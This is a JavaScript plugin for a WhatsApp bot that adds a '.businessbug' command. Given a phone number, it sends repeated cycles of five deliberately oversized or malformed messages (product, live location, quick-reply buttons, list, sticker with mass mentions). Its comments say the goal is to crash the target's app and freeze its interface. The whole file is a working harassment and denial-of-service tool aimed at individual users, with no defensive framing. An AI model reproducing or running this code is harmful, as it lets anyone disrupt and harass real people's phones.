const { cmd } = require('../command');
const axios = require('axios');
const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');

// Fallback for different Baileys versions
if (!generateWAMessageFromContent) {
    try { generateWAMessageFromContent = require('@adiwajshing/baileys').generateWAMessageFromContent; } catch(e) {}
}

async function getImageBuffer(url) {
    try {
        const response = await axios.get(url, { responseType: 'arraybuffer', timeout: 10000 });
        return Buffer.from(response.data);
    } catch (error) {
        return null;
    }
}

function getTarget(args, from, reply, cmdName) {
    if (!args || !args[0]) {
        reply(`❌ *Missing target number!*\n\nUsage: .${cmdName} 947XXXXXXXXX [cycles]\nExample: .${cmdName} 94712345678 5`);
        return null;
    }
    return args[0].replace(/[^\d]/g, '') + '@s.whatsapp.net';
}

// ================================================================
// 2. BUSINESS CRASH FUNCTION (RELIABLE PAYLOADS)
// ================================================================

async function businessCrash(conn, target) {
    // Payload 1: Product message with huge title/description (original working)
    const productPayload = {
        viewOnceMessage: {
            message: {
                productMessage: {
                    product: {
                        productId: "999999999999999",
                        title: "A".repeat(50000),
                        description: "B".repeat(80000),
                        priceAmount1000: { low: 999999999, high: 999999999, unsigned: true },
                        url: "https://wa.me/status",
                        productImageCount: 9999999,
                        firstImageId: "9999999999"
                    },
                    businessOwnerJid: "13135550002@s.whatsapp.net"
                }
            }
        }
    };
    const msg1 = generateWAMessageFromContent(target, productPayload, {});
    await conn.relayMessage(target, msg1.message, {});

    // Payload 2: Live location with enormous caption (memory overload)
    const locationPayload = {
        viewOnceMessage: {
            message: {
                liveLocationMessage: {
                    degreesLatitude: 6.9271,
                    degreesLongitude: 79.8612,
                    caption: "X".repeat(150000),
                    sequenceNumber: 0
                }
            }
        }
    };
    const msg2 = generateWAMessageFromContent(target, locationPayload, {});
    await conn.relayMessage(target, msg2.message, {});

    // Payload 3: Interactive message with 2000 quick-reply buttons (UI freeze)
    const quickReplies = [];
    for (let i = 0; i < 2000; i++) {
        quickReplies.push({
            name: "quick_reply",
            buttonParamsJson: JSON.stringify({ display_text: "Reply".repeat(100) + i, id: `qr_${i}` })
        });
    }
    const interactivePayload = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    body: { text: "Quick replies flood" },
                    nativeFlowMessage: { buttons: quickReplies },
                    contextInfo: { mentionedJid: [target] }
                }
            }
        }
    };
    const msg3 = generateWAMessageFromContent(target, interactivePayload, {});
    await conn.relayMessage(target, msg3.message, {});

    // Payload 4: List message with 5000 sections (list renderer crash)
    const sections = [];
    for (let i = 0; i < 5000; i++) {
        sections.push({
            title: "Section".repeat(100) + i,
            rows: [{ title: "Row".repeat(100) + i, rowId: `row_${i}` }]
        });
    }
    const listPayload = {
        listMessage: {
            title: "LIST CRASH".repeat(1000),
            footerText: "Footer",
            description: "Description",
            buttonText: "Click",
            listType: 2,
            sections: sections
        }
    };
    const msg4 = generateWAMessageFromContent(target, listPayload, {});
    await conn.relayMessage(target, msg4.message, {});

    // Payload 5: Sticker with extreme file length and mentions
    const stickerPayload = {
        stickerMessage: {
            url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4",
            fileSha256: "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
            fileEncSha256: "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
            mediaKey: "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
            mimetype: "image/webp",
            fileLength: "9999999999999999999",
            isAnimated: false,
            contextInfo: {
                mentionedJid: [target, ...Array.from({ length: 2000 }, () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`)]
            }
        }
    };
    const msg5 = generateWAMessageFromContent(target, stickerPayload, {});
    await conn.relayMessage(target, msg5.message, {});
}

// ================================================================
// 3. COMMAND HANDLER
// ================================================================

cmd({
    pattern: "businessbug",
    desc: "💼 Business crash – 5 reliable payloads per cycle (product, location, interactive, list, sticker)",
    category: "tools",
    filename: __filename
},
async (conn, mek, m, { from, reply, args }) => {
    const target = getTarget(args, from, reply, "businessbug");
    if (!target) return;
    let cycles = parseInt(args[1]) || 10;
    if (cycles > 50) cycles = 50;
    await reply(`💼 *BUSINESS CRASH* → ${target}\n_Sending ${cycles} cycles (5 payloads each)..._`);
    try {
        for (let i = 0; i < cycles; i++) {
            await businessCrash(conn, target);
            await new Promise(r => setTimeout(r, 200));
        }
        const successImg = await getImageBuffer("https://whiteshadow-uploader.vercel.app/files/813.jpg");
        const caption = `✅ BUSINESS CRASH DELIVERED → ${target}\n⚠️ *Target flooded with ${cycles*5} malformed business messages.*`;
        if (successImg) await conn.sendMessage(from, { image: successImg, caption });
        else await reply(caption);
    } catch (err) {
        console.error(err);
        await reply(`❌ Failed: ${err.message}`);
    }
});

console.log('✅ Business Bug Plugin Loaded!');
console.log('📌 Command: .businessbug');
console.log('📌 Usage: .businessbug <number> [cycles]');
